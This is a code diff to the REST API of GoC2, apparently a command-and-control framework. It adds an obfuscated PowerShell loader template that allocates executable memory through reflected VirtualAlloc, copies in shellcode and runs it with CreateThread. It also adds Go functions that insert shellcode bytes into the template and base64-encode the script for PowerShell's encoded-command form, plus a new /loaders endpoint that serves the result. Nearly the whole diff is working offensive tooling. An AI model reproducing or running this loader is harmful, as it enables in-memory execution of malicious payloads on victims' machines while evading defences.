@@ -2,6 +2,8 @@ package routes
 
 import (
 	"context"
+	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -21,6 +23,7 @@ import (
 	"github.com/latortuga71/GoC2/pkg/generators/SRDI"
 	"github.com/latortuga71/GoC2/pkg/generators/donut"
 	"github.com/mattn/go-shellwords"
+	"golang.org/x/text/encoding/unicode"
 )
 
 func LogRequest(c *gin.Context) {
@@ -315,6 +318,96 @@ func validateDonut(payload *data.DonutPayload) bool {
 	return true
 }
 
+/// shellcode loaderss
+
+var pwshLoader string = `function potatoes {
+	Param ($DLL, $METHOD)
+	$tomatoes = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+	$turnips=@()
+	$tomatoes.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$turnips+=$_}}
+	return $turnips[0].Invoke($null, @(($tomatoes.GetMethod('GetModuleHandle')).Invoke($null, @($DLL)), $METHOD))
+	}
+	
+	function apples {
+	Param (
+	[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+	[Parameter(Position = 1)] [Type] $delType = [Void]
+	)
+	$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+	$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+	$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+	return $type.CreateType()
+	}
+	
+	$cucumbers = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll VirtualAlloc), (apples @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 8000000, 0x3000, 0x40)
+	
+	# read from disk
+	#[Byte[]] $buf = [System.IO.File]::ReadAllBytes("C:\\tmp\donut\client_latest.bin")
+	# base64 option
+	#[Byte[]] $buf = [System.Convert]::FromBase64String("")
+	# provide hex bytes
+	
+	[Byte[]] $buf = REPLACE
+	
+	[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $cucumbers, $buf.length)
+	
+	$parsnips = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll CreateThread), (apples @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$cucumbers,[IntPtr]::Zero,0,[IntPtr]::Zero)
+	
+	# wait on it.
+	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((potatoes kernel32.dll WaitForSingleObject), (apples @([IntPtr], [Int32]) ([Int]))).Invoke($parsnips, 0xFFFFFFFF)`
+
+func NewEncodedPSScript(script string) (string, error) {
+	uni := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM)
+	encoded, err := uni.NewEncoder().String(script)
+	if err != nil {
+		return "", err
+	}
+
+	return base64.StdEncoding.EncodeToString([]byte(encoded)), nil
+}
+func ConvertPwsh(raw []byte) (string, string) {
+	var csharp string
+	rawHex := hex.EncodeToString(raw)
+	//var classic string
+	//b64Raw := base64.RawStdEncoding.EncodeToString(raw)
+	//log.Printf("Raw b64 %s\n", b64Raw)
+	//fmt.Printf("--- Raw Shellcode --- \n")
+	// standard c++ format
+	/*rawHex := hex.EncodeToString(raw)
+	for x := 0; x < len(rawHex)/2; x++ {
+		classic += fmt.Sprintf("\\x%x", raw[x:x+1])
+	}*/
+	//fmt.Println(classic)
+	//fmt.Printf("--- C# Format ---\n")
+	for x := 0; x < len(rawHex)/2; x++ {
+		csharp += fmt.Sprintf("0x%x, ", raw[x:x+1])
+	}
+	csharp = csharp[0 : len(csharp)-2]
+	newLoader := strings.Replace(pwshLoader, "REPLACE", csharp, -1)
+	loaderB64, err := NewEncodedPSScript(newLoader)
+	if err != nil {
+		return newLoader, ""
+	}
+	return newLoader, loaderB64
+}
+
+func LoaderEndpoint(c *gin.Context) {
+	LogRequest(c)
+	loaderPayload := &data.LoaderPayload{}
+	err := c.BindJSON(loaderPayload)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"Error": "Invalid Json"})
+		return
+	}
+	loader, b64Loader := ConvertPwsh(loaderPayload.RawShellcodeBytes)
+	responsePayload := data.LoaderPayload{}
+	responsePayload.LoaderString = loader
+	responsePayload.LoaderStringB64 = b64Loader
+	c.JSON(http.StatusOK, responsePayload)
+	return
+}
+
+///
 func SRDIEndpoint(c *gin.Context) {
 	LogRequest(c)
 	//body, _ := ioutil.ReadAll(c.Request.Body)
@@ -364,6 +457,7 @@ func StartRestAPI(port string) {
 		v1.GET("/operators", OperatorsEndpoint)
 		v1.POST("/donut", DonutEndpoint)
 		v1.POST("/srdi", SRDIEndpoint)
+		v1.POST("/loaders", LoaderEndpoint)
 	}
 	err := router.RunTLS(fmt.Sprintf("0.0.0.0:%s", port), "../certs/server.cert", "../certs/server.key")
 	log.Log.Fatal().Str("service", "RestAPI").Msgf("%v", err)
